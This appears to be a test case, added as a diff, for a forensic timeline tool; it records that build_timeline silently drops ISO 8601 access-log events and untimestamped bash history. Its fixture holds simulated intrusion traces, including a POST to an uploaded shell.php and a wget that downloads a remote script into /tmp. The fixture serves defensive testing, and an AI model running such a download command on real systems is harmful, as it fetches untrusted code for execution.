@@ -1,0 +1,36 @@
+# Matrix case P4111-007: build_timeline drops access-log events whose time it
+# cannot normalise (anything but nginx's default [dd/Mon/yyyy:...] format)
+# and bash history commands without HISTTIMEFORMAT timestamps, and does not
+# say how many were dropped.
+case_id: P4111-007
+problem: P4111
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: source-vs-result
+level: mcp
+realism: common
+coverage: full
+summary: With an access.log written in ISO 8601 time ($time_iso8601) and a .bash_history without timestamps, build_timeline lists only the single auth.log event, under "Events 1", and gives no count or note for the web request and shell command it dropped.
+fixture:
+  - path: case/auth.log
+    text: "Apr 12 10:00:00 web01 sshd[2211]: Accepted password for alice from 203.0.113.5 port 51122 ssh2\n"
+  - path: case/access.log
+    text: "203.0.113.50 - - [2026-04-12T10:05:00+00:00] \"POST /uploads/shell.php HTTP/1.1\" 200 31 \"-\" \"curl/8.0\"\n"
+  - path: case/fs/home/alice/.bash_history
+    text: "wget http://203.0.113.7/x.sh -O /tmp/x.sh\n"
+steps:
+  - tool: build_timeline
+    args:
+      evidence_root: ${EVIDENCE}/case
+expect:
+  - step: 1
+    contains: "- **Events:** 1"
+  - step: 1
+    contains: "- **Sources:** auth.log"
+  - step: 1
+    not_contains: "shell.php"
+  - step: 1
+    not_contains: "wget"
+  - step: 1
+    not_regex: "(?i)dropped|skipped|omitted|could not (parse|normali)|without timestamp"
